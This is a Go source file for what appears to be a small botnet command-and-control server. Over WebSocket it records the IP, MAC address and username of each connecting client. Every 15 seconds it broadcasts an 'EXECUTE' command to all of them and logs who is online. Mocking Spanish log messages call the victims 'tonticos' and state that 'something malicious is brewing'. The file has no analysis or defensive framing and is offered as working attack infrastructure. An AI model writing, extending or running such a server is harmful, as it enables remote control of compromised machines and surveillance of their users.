package main

import (
	"encoding/json"
	"log"
	"net/http"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

type ClientInfo struct {
	IP        string    `json:"ip"`
	MAC       string    `json:"mac"`
	Username  string    `json:"username"`
	Connected time.Time `json:"connected"`
}

type Client struct {
	Conn *websocket.Conn
	Info ClientInfo
}

var (
	clients   = make(map[*websocket.Conn]Client)
	clientsMu sync.Mutex
	upgrader  = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool { return true },
	}
)

func wsHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println("Upgrade error:", err)
		return
	}

	defer conn.Close()

	var info ClientInfo
	if err := conn.ReadJSON(&info); err != nil {
		log.Println("Read JSON error:", err)
		return
	}
	info.Connected = time.Now()

	clientsMu.Lock()
	clients[conn] = Client{Conn: conn, Info: info}
	clientsMu.Unlock()

	log.Printf("🟢🟢 tontico conectao: %+v\n", info)

	for {
		if _, _, err := conn.ReadMessage(); err != nil {
			clientsMu.Lock()
			delete(clients, conn)
			clientsMu.Unlock()
			log.Println("🔴🔴 tontico se fue:", info.Username)
			break
		}
	}
}

func broadcastExecute() {
	clientsMu.Lock()
	defer clientsMu.Unlock()

	msg := map[string]string{
		"action": "EXECUTE",
	}

	for conn := range clients {
		_ = conn.WriteJSON(msg)
	}
}

func activeClientsJSON() []byte {
	clientsMu.Lock()
	defer clientsMu.Unlock()

	list := []ClientInfo{}
	for _, c := range clients {
		list = append(list, c.Info)
	}

	data, _ := json.MarshalIndent(list, "", "  ")
	return data
}

func main() {
	http.HandleFunc("/ws", wsHandler)

	go func() {
		for {
			time.Sleep(15 * time.Second)
			log.Println("something malicious is brewing")
			broadcastExecute()
			log.Println("tonticos en linea:", string(activeClientsJSON()))
		}
	}()

	log.Println("Servidor WS en :8080")
	log.Fatal(http.ListenAndServe(":8080", nil))
}